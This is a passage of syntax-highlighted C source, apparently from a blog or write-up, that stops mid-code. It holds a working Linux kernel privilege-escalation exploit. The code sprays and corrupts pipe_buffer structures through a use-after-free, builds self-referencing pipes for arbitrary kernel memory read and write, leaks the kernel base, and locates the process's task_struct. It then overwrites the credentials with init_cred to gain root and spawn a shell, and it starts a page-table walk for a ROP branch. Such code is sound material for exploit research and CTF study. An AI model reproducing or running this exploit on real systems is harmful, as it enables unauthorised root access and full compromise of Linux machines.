class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> str_flag[<span class="number">0x10</span>];</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memset</span>(str_flag, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(str_flag));</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], str_flag, <span class="number">8</span>);</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(str_flag, <span class="string">&quot;0x196082&quot;</span>) &amp;&amp; nr != i)</span><br><span class="line">            &#123;</span><br><span class="line">                orig_pid = nr;</span><br><span class="line">                victim_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>,</span><br><span class="line">                       victim_pid, orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> snd_orig_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">               info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> || (<span class="keyword">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">        info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">            <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)</span><br><span class="line">            &#123;</span><br><span class="line">                snd_orig_pid = nr;</span><br><span class="line">                snd_vicitm_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">        evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">        evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_2nd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       self_2nd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_3rd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_3rd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i == self_3rd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_4th_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_4th_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">        evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">        evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">        evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">        evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">        write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">        evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        vmemmap_base = (<span class="keyword">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)buf &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((*(<span class="keyword">uint64_t</span> *)buf &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x070</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       kernel_base, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> parent_task, current_task;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> *comm_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint64_t</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * <span class="number">0x40</span>), point_buf);</span><br><span class="line"></span><br><span class="line">            comm_addr = memmem(point_buf, <span class="number">0xf00</span>, target, <span class="number">0xf</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">                current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">                page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">                page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       (struct page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       page_offset_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                       current_task);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> command = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> stack_addr;</span><br><span class="line">    <span class="keyword">size_t</span> *tsk_buf;</span><br><span class="line">    <span class="keyword">size_t</span> *mm_struct_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_page;</span><br><span class="line">    <span class="keyword">uint64_t</span> pgd_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (command)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_task;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_cred;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_nsproxy;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (;;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">                tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((struct page *)ptask_page_addr, buf);</span><br><span class="line">                arbitrary_read_by_pipe((struct page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">                <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            init_task = parent_task;</span><br><span class="line">            init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">            init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>),</span><br><span class="line">                                    &amp;buf[<span class="number">512</span> * <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">            <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span> stack_addr_another;</span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            